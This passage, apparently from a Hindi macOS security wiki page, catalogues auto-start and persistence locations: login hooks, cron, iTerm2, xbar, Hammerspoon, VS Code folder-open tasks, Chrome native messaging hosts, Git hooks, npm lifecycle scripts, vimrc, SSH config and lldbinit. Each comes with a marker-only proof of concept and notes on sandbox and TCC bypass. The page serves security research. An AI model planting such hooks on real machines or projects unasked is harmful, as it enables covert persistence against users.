**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- आपको `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` जैसी कोई command execute करने में सक्षम होना होगा
  - `Lo` में स्थित है `~/Library/Preferences/com.apple.loginwindow.plist`

ये deprecated हैं, लेकिन user के login करने पर commands execute करने के लिए इस्तेमाल किए जा सकते हैं।<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत है.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

इसे हटाने के लिए:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root user वाला यहाँ stored होता है: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी, जिनकी मदद से आप बस किसी चीज़ को **file में लिखकर** execute कर सकते हैं और **कुछ कम आम परिस्थितियों** की उम्मीद कर सकते हैं, जैसे कि खास **programs installed होना, user की "असामान्य" गतिविधियाँ** या environments।

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - हालाँकि, आपको `crontab` binary execute करने में सक्षम होना होगा
  - या root होना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - सीधे write access के लिए root आवश्यक है। यदि आप `crontab <file>` execute कर सकते हैं, तो root आवश्यक नहीं है
  - **Trigger**: installed crontab में schedule। `at` और `periodic` नीचे अलग mechanisms हैं।

#### Description & Exploitation

इससे **current user** के cron jobs की सूची देखें:

```bash
crontab -l
```

सिस्टम cron daemon के launchd plist में `/usr/lib/cron/tabs` के लिए `QueueDirectories` एंट्री है; यहीं इंस्टॉल किए गए यूज़र crontab रखे जाते हैं। अन्य यूज़र के crontab देखने के लिए root access चाहिए:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

एक disposable account में, `crontab` से केवल marker वाली user cron entry इंस्टॉल की जा सकती है और उसे देखने के बाद हटाया जा सकता है। `crontab <file>` **account का पूरा मौजूदा crontab बदल देता है**, इसलिए यदि account disposable नहीं है, तो उसे सेव करके बाद में restore करें:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

लेख: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 को पहले TCC permissions मिली हुई थीं

#### स्थान

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **ट्रिगर**: उस फ़ोल्डर में मौजूद योग्य Python API script के साथ iTerm2 शुरू करें
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **ट्रिगर**: iTerm2 शुरू करें; AppleScript startup hook का दस्तावेज़ अलग से दिया गया है
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **ट्रिगर**: ऐसा profile चुनकर session बनाएँ जिसका command या initial text payload चलाता हो

#### विवरण और Exploitation

[iTerm2 Python API की मौजूदा गाइड](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` में auto-run **Python** scripts चलाने का दस्तावेज़ देती है। इसमें यह नहीं कहा गया है कि उस फ़ोल्डर में मौजूद कोई भी `.sh` executable फ़ाइल चलती है। अस्थायी खाते के लिए, इसे `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` के रूप में सेव करें:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[वर्तमान iTerm2 AppleScript गाइड](https://iterm2.com/documentation-scripting.html) में `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` का अलग से दस्तावेज़ीकरण किया गया है। इसमें `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` को पुराने विकल्प के रूप में इस्तेमाल किया जाता है, जब आधुनिक फ़ोल्डर मौजूद न हो। केवल marker वाला AppleScript यह है:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

इन script उदाहरणों को iTerm2 के दस्तावेज़ों के आधार पर जाँचा गया था; इन्हें सक्रिय desktop session में नहीं चलाया गया था। disposable account में परीक्षण करने के बाद, test script और `/tmp/ht-iterm-autolaunch-marker` या `/tmp/iterm2-autolaunchscpt` को हटा दें।

**`~/Library/Preferences/com.googlecode.iterm2.plist`** में मौजूद iTerm2 preferences, profile command या initial text निर्दिष्ट कर सकती हैं। initial text किसी session में टाइप किया जाता है; इसका execution इस बात पर निर्भर करता है कि कोई shell इसकी व्याख्या करता है या नहीं। [iTerm2 का profile documentation](https://iterm2.com/documentation-preferences-profiles-general.html) उस command का वर्णन करता है जो उस profile के साथ नया session बनाए जाने पर चलती है।

इस setting को iTerm2 settings में configure किया जा सकता है:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और command preferences में दिखाई देती है:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

सुरक्षित आकलन के लिए, iTerm2 settings में चुने गए profile का निरीक्षण करें या उसकी preference file की एक प्रति पढ़ें। किसी live profile में `Initial Text` बदलने से उपयोगकर्ता के sessions प्रभावित होंगे, इसलिए research Mac पर कोई preference नहीं बदली गई।

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन xbar इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions का अनुरोध करता है

#### स्थान

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Trigger**: xbar execute होने पर

#### विवरण

अगर लोकप्रिय program [**xbar**](https://github.com/matryer/xbar) इंस्टॉल है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक shell script लिखना संभव है, जो xbar शुरू होने पर execute होगी:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**लेखन**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Hammerspoon इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions मांगता है

#### स्थान

- **`~/.hammerspoon/init.lua`**
  - **ट्रिगर**: Hammerspoon के execute होने पर

#### विवरण

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक automation platform है, जो अपने संचालन के लिए **LUA scripting language** का उपयोग करता है। उल्लेखनीय रूप से, यह पूर्ण AppleScript code के integration और shell scripts के execution का समर्थन करता है, जिससे इसकी scripting capabilities काफी बढ़ जाती हैं।<sup>[[13]](#references)</sup>

ऐप एक ही फ़ाइल, `~/.hammerspoon/init.lua`, ढूँढ़ता है और शुरू होने पर script execute हो जाएगी।

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन BetterTouchTool इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation-Shortcuts और Accessibility permissions का अनुरोध करता है

#### Location

- कोई script file जिसे enabled BetterTouchTool preset में **पहले से reference किया गया हो**, या उस preset का configuration `~/Library/Application Support/BetterTouchTool/` के अंतर्गत हो। सटीक script path इस बात पर निर्भर करता है कि preset को कैसे configure किया गया था।

[BetterTouchTool की action reference](https://docs.folivora.ai/docs/actions/action-definitions/) shell-script और background-command actions को document करती है। संबंधित preset के active रहने के दौरान configure किया गया keyboard, mouse, touch, widget या कोई अन्य event होना चाहिए; [इसकी trigger guide](https://docs.folivora.ai/docs/configuration/new-trigger/) इस pairing को दिखाती है। Application-support directory में मौजूद कोई random file trigger नहीं होती। ऐसा पहले से configured action जो किसी external writable script को load करता हो, write-to-execution का अधिक सीमित target है। Code, BetterTouchTool user के account के रूप में चलता है और उस पर macOS grants लागू होते हैं। Research Mac पर `/Applications` में BetterTouchTool मौजूद नहीं था, इसलिए स्थानीय स्तर पर कोई preset बदला या execute नहीं किया गया।

### Alfred

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Alfred इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation, Accessibility और यहां तक कि Full-Disk access permissions का अनुरोध करता है

#### Location

- कोई script या file जिसे किसी installed Alfred workflow में **पहले से reference किया गया हो**, या उपयोगकर्ता की configured `Alfred.alfredpreferences` directory के अंतर्गत वह workflow। Preferences directory sync की जा सकती है और उसका कोई एक तय सार्वभौमिक path नहीं है।

[Alfred की workflow guide](https://www.alfredapp.com/help/workflows/) Powerpack की prerequisite और UI के ज़रिए installation का वर्णन करती है। Installed workflow का hotkey, keyword या कोई अन्य configured trigger सक्रिय होना चाहिए; [Alfred का hotkey example](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) script action दिखाता है। [Alfred की environment reference](https://www.alfredapp.com/help/workflows/script-environment-variables/) चुने गए preferences path को `alfred_preferences` के रूप में उपलब्ध कराती है। किसी मनमानी directory में unregistered workflow file डालने से यह साबित नहीं होता कि वह install या run होगी। Code, signed-in Alfred user के रूप में चलता है और उस पर macOS के वास्तविक grants लागू होते हैं। Research Mac पर `/Applications` में Alfred मौजूद नहीं था, इसलिए इस path का आकलन केवल documentation के आधार पर किया गया।

### Raycast Script Commands और extension refresh

- **Write target:** किसी ऐसी directory में executable script जिसे Raycast Settings → Script Commands के अंतर्गत **पहले से जोड़ा गया हो**। Raycast किसी मनमाने नए बनाए गए directory को scan नहीं करता। [Raycast की Script Commands guide](https://manual.raycast.com/script-commands) directory registration का वर्णन करती है।
- **Trigger और identity:** उपयोगकर्ता indexed command चलाता है, कोई configured hotkey या fallback उसे चलाता है, या Raycast किसी `inline` script को उसके configured `@raycast.refreshTime` पर refresh करता है। Script, signed-in Raycast user के रूप में उसके interpreter के ज़रिए चलती है। [Upstream metadata reference](https://github.com/raycast/script-commands#metadata) automatic refresh को केवल inline commands तक सीमित करती है, और [Raycast का extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) installed `no-view` या `menu-bar` extension commands के लिए अलग से `interval` का समर्थन करता है। केवल कोई सामान्य script command जोड़ने से उसका चलना schedule नहीं होता।

Registered script directory वाले disposable account के लिए, केवल marker लिखने वाली inline script यह है:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

इसे registered directory में save करें, executable बनाएं, और Raycast को इसे refresh करने दें। फिर उस file और `/tmp/ht-raycast-refresh-marker` को हटा दें। Research Mac पर Raycast अपने सामान्य `/Applications` नाम के अंतर्गत नहीं मिला, इसलिए यह documentation-backed है और स्थानीय रूप से नहीं चलाया गया। Accessibility, Automation और file grants पर macOS permission prompts लागू होते हैं।

### Visual Studio Code automatic workspace tasks

- **Write target:** उपयोगकर्ता द्वारा खोले जाने वाले workspace के अंदर `.vscode/tasks.json`।
- **Trigger:** VS Code में उस workspace को खोलना, लेकिन केवल तभी जब folder trusted हो **और** automatic tasks को अनुमति दी गई हो। Untrusted workspace में automatic tasks कभी नहीं चलते; default setting पहले automatic run से पहले उपयोगकर्ता से पूछती है। [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) और [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) इन दोनों gates का वर्णन करते हैं।
- **Execution identity:** VS Code उपयोगकर्ता का account, configured task process के ज़रिए। यह application-specific execution है, login persistence नहीं।

एक **नए, disposable workspace** में, यह marker-only task `.vscode/tasks.json` में रखें:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

विश्वसनीय workspace खोलने और automatic tasks की अनुमति देने के बाद, `.autostart-task-ran` की जाँच करें। सफ़ाई के लिए task entry और marker हटा दें। **इसकी पुष्टि Microsoft के documentation और installed VS Code 1.139.1 bundle के आधार पर की गई थी; इसे active desktop session में नहीं चलाया गया।**

### Chrome native messaging hosts

- **Write target:** मौजूदा user के लिए `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`, या सभी users के लिए `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` (इसके लिए admin write access चाहिए)। Chromium और Chrome for Testing अलग-अलग directories का उपयोग करते हैं; [Chrome की मौजूदा path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location) देखें।
- **Trigger:** `nativeMessaging` permission वाला installed Chrome extension, manifest के exact host name का उपयोग करके `chrome.runtime.connectNative()` या `chrome.runtime.sendNativeMessage()` call करता है। इसके बाद Chrome host executable शुरू करता है। केवल Chrome खोलने से कोई मनमाना नया native host execute नहीं होता; calling extension के बिना manifest बनाने से कुछ नहीं होता। [Chrome की native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) इस handshake का विवरण देती है।
- **Execution identity:** Chrome user का account। Manifest में absolute executable path देना और calling extension origin को स्पष्ट रूप से allow करना ज़रूरी है।

Test extension वाले disposable browser account में, नीचे दी गई files की जोड़ी write-to-execution link दिखाती है। Manifest का filename उसके `name` से मेल खाना चाहिए, और `TEST_EXTENSION_ID` को उस extension की वास्तविक ID से बदलना होगा:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

इस JSON को `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` के रूप में सहेजें। मेनिफेस्ट के `path` पर मौजूद केवल marker वाला executable यह रख सकता है:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

टेस्ट extension अपने service worker या extension page से `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` कॉल करने के बाद marker यह साबित करता है कि host शुरू हुआ। यह न्यूनतम host Chrome के length-prefixed response protocol को लागू नहीं करता, इसलिए marker लिखे जाने के बाद extension messaging error दिखा सकता है। सफ़ाई के लिए टेस्ट manifest, host और marker हटाएँ। macOS 26.5.2 पर Chrome app और दोनों manifest directories मौजूद थे; **active Chrome profile में कोई बदलाव नहीं किया गया और न ही उसका उपयोग किया गया।**

### Karabiner-Elements key-event कमांड

- **लिखने का लक्ष्य:** उस account में `~/.config/karabiner/karabiner.json`, जहाँ Karabiner-Elements इंस्टॉल और चालू है। [Karabiner's file-location guide](https://karabiner-elements.pqrs.org/docs/json/location/) के अनुसार, app इस फ़ाइल को देखता है और इसमें बदलाव लिखे जाने के बाद इसे reload करता है। `assets/complex_modifications` में मौजूद JSON फ़ाइलें केवल import किए जा सकने वाले presets हैं; वहाँ केवल फ़ाइल लिखने से कोई rule सक्षम नहीं होता।
- **ट्रिगर:** rule सक्रिय होने के बाद कॉन्फ़िगर किया गया key event। [`to.shell_command` reference](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) command execution के बारे में जानकारी देता है। यह login पर या हर file write पर code execution नहीं है।
- **निष्पादन पहचान:** Karabiner का user process चलाने वाला signed-in user। इसके अपने permission grants और कोई भी TCC access, app और version पर निर्भर करते हैं।

एक अस्थायी टेस्ट account के लिए, `karabiner.json` में चुने गए profile के `complex_modifications.rules` array में यह rule object जोड़ें और उस profile का बाकी हिस्सा जस का तस रखें। एक harmless marker बनाने के लिए F18 दबाएँ, फिर यह rule और marker हटा दें। सामान्य typing key को बदलने से बचने के लिए F18 चुनें:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

macOS 26.5.2 test machine पर Karabiner-Elements `/Applications` में installed नहीं था, इसलिए यह local runtime result के बजाय documentation-backed PoC है।

### स्थानीय repository में Git hooks

- **Write target:** `<repo>/.git/hooks/post-checkout` जैसा executable hook। अगर `core.hooksPath` पहले से set है, तो उसके बजाय उस configured directory का उपयोग करें। सामान्य tracked source file के रूप में committed hook clone में अपने-आप install नहीं होता।
- **Trigger:** उससे संबंधित Git operation। उदाहरण के लिए, `post-checkout` `git checkout` या `git switch` के बाद चलता है, और clone या worktree creation के बाद भी चल सकता है। [Git's hook reference](https://git-scm.com/docs/githooks) events और executable-bit की आवश्यकता सूचीबद्ध करता है; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) lookup directory बदलता है।
- **Execution identity:** Git चलाने वाला account। Hook तभी execute हो सकता है जब repository की effective hooks directory actor के लिए writable हो और user बाद में संबंधित Git operation करे।

यह marker-only PoC पूरी तरह disposable repository बनाता है, एक hook install करता है और branch switch करता है। इसे macOS 26.5.2 पर Apple Git 2.50.1 के साथ सफलतापूर्वक execute किया गया था:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### किसी प्रोजेक्ट में npm lifecycle scripts

- **लिखने का लक्ष्य:** लिखने योग्य प्रोजेक्ट के `package.json` में `scripts` map, या ऐसा installed dependency package जिसकी lifecycle script उपयोगकर्ता चलाएगा। यह development workflow hook है, किसी directory को खोलने पर चलने वाला execution नहीं।
- **ट्रिगर और पहचान:** बाद में `npm install` या `npm ci` चलाने पर, यदि lifecycle scripts की अनुमति हो, तो `preinstall`, `install` और `postinstall` npm चलाने वाले उपयोगकर्ता के रूप में चलते हैं। सामान्य `npm run <name>` भी मेल खाने वाली `pre<name>` और `post<name>` scripts चलाता है। [npm का lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) events की सूची देता है; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) install lifecycle scripts को रोक सकता है। Version और policy settings से अनुमतियाँ बदल सकती हैं, इसलिए target npm version जाँचें।

यह केवल marker वाला PoC disposable, खाली directory में local npm के साथ चलाया गया था। यह dependencies डाउनलोड नहीं करता और न ही उपयोगकर्ता के प्रोजेक्ट में बदलाव करता है:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

यह Python interpreter startup files से अलग है: npm को संबंधित install या run action करना पड़ता है, जबकि Python `site` code सामान्य interpreter invocation पर load हो सकता है। Generic `Makefile` targets और build task definitions के लिए भी user या पहले से configured tool को उस target को invoke करना पड़ता है; ये अलग OS auto-start paths नहीं हैं।

### Vim startup configuration

- **Write target:** Vim launch करने वाले user के लिए `~/.vimrc` (या Vim के initialization order से चुनी गई कोई अन्य startup file)। [Vim का startup reference](https://vimhelp.org/starting.txt.html) इस file और `VIMINIT`/`EXINIT` overrides को document करता है।
- **Trigger:** इसके बाद Vim का सामान्य start, जो इस configuration को load करता है। Vim का `-u NONE` user vimrc को bypass करता है। यह editor-specific execution है, OS login trigger नहीं।
- **Execution identity:** Vim user का account।

निम्नलिखित isolated PoC को macOS के `/usr/bin/vim` पर चलाया गया था; यह कोई वास्तविक Vim preferences या open documents नहीं लिखता:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim का अलग user configuration path `$XDG_CONFIG_HOME/nvim/init.lua` या `init.vim` होता है, और इसके [startup documentation](https://neovim.io/doc/user/starting/) के अनुसार यह अपनी `plugin/` runtime directories में scripts भी load करता है। macOS 26.5.2 test machine पर Neovim installed नहीं था, इसलिए इस variant को वहाँ run नहीं किया गया।

### SSH client configuration commands

- **Write target:** `~/.ssh/config`, या कोई दूसरी file जिसे यह पहले से include करती हो। यह **client** configuration file है; यह नीचे वर्णित server-side `~/.ssh/rc` से अलग है।
- **Trigger:** इससे मेल खाने वाला `ssh` invocation। Client configuration evaluate करते समय `Match exec` एक local command चलाता है—`ssh -G` के लिए भी, जो बिना connect किए configuration print करता है। Matching connection सेट up करते समय `ProxyCommand` चलता है। `LocalCommand` केवल successful connection के बाद चलता है और इसके लिए `PermitLocalCommand yes` ज़रूरी है (default `no` है)। इनके चलने का समय और prerequisites अलग-अलग हैं; केवल write करने से ये execute नहीं होते। Upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) देखें।
- **Execution identity:** `ssh` चलाने वाला local user। Matching host, लागू configuration file और ज़रूरी connection आवश्यक हैं। `ssh -F` कोई दूसरी configuration file चुन सकता है।

यह marker-only PoC macOS 26.5.2 पर Apple के SSH client के साथ run किया गया था। `-G` network connection बनाए बिना और user की असली SSH configuration पढ़े बिना `Match exec` को exercise करता है:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger initialization files

- **लिखने का लक्ष्य:** `~/.lldbinit` या उच्च प्राथमिकता वाली application-specific फ़ाइल, जैसे `~/.lldbinit-lldb`। LLDB debugger शुरू होने पर इनमें से एक फ़ाइल पढ़ता है। मौजूदा directory की `.lldbinit` डिफ़ॉल्ट रूप से **निष्पादित नहीं** होती; उपयोगकर्ता को `target.load-cwd-lldbinit` सक्षम करना होगा या `--local-lldbinit` पास करना होगा। [LLDB manual](https://lldb.llvm.org/man/lldb.html) देखें।
- **ट्रिगर और पहचान:** उपयोगकर्ता LLDB को `--no-lldbinit` के बिना शुरू करता है; commands उसी उपयोगकर्ता के रूप में चलती हैं। केवल project खोलने से यह नहीं माना जा सकता कि उसका `.lldbinit` चलेगा।

निम्न marker-only परीक्षण macOS 26.5.2 पर LLDB के साथ, अलग home और working directory का उपयोग करके चलाया गया:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

**GDB** के लिए, [upstream startup दस्तावेज़](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) में macOS पर `$HOME/Library/Preferences/gdb/gdbinit` और फिर `~/.gdbinit` सूचीबद्ध हैं। मौजूदा डायरेक्टरी की `.gdbinit` फ़ाइल [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) के अधीन होती है, और `-nx`/`-nh` initialization files को दबाते हैं। टेस्ट Mac पर GDB इंस्टॉल नहीं था, इसलिए इस variant को स्थानीय रूप से नहीं चलाया गया।

### SSHRC

लेख: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन ssh सक्षम होना चाहिए और उसका उपयोग किया जाना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH का उपयोग FDA access पाने के लिए होता है

#### Location

- **`~/.ssh/rc`**
  - **Trigger**: ssh से Login
- **`/etc/ssh/sshrc`**
  - Root आवश्यक
  - **Trigger**: ssh से Login

> [!CAUTION]
> ssh चालू करने के लिए Full Disk Access आवश्यक है:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### विवरण और शोषण

डिफ़ॉल्ट रूप से, `/etc/ssh/sshd_config` में `PermitUserRC no` सेट न होने पर, जब कोई उपयोगकर्ता **SSH के ज़रिए लॉगिन करता है**, तो स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** निष्पादित होंगी।<sup>[[14]](#references)</sup>

### **Login Items**

लेख: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको `osascript` को args के साथ निष्पादित करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **Registered login-item helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (आम bundled location)।
  - **Trigger:** Registration से helper तुरंत शुरू हो सकता है; बाद के user logins पर भी यह शुरू होगा, approval के अधीन।
- **Registered bundled agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` या `Contents/Library/LaunchDaemons/<name>.plist`।
  - **Trigger:** Approved agent registration के समय और बाद के logins पर शुरू हो सकता है; approved daemon boot के समय शुरू होता है। Daemon के लिए admin approval आवश्यक है।

#### विवरण

**System Settings → General → Login Items & Extensions** में, उपयोगकर्ता login और background items की समीक्षा कर सकते हैं। macOS 13 और बाद के संस्करण, bundled login items, launch agents और launch daemons को register करने के लिए [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) प्रदान करते हैं। इसका [`register()` behavior](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) item के type और approval state के अनुसार अलग होता है। **किसी helper को app bundle में लिखना, नया login item register करने के लिए पर्याप्त नहीं है।** इसके विपरीत, यदि पहले से registered helper executable writable है, तो उसमें बदलाव उसके अगले launch को प्रभावित कर सकता है, बिना नए registration के; पहले वास्तविक path और code-signing checks की पुष्टि करें।

Mac पर bundled helpers खोजने का निम्नलिखित तरीका केवल पढ़ने के लिए है; इससे कोई भी helper register या launch नहीं होता:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

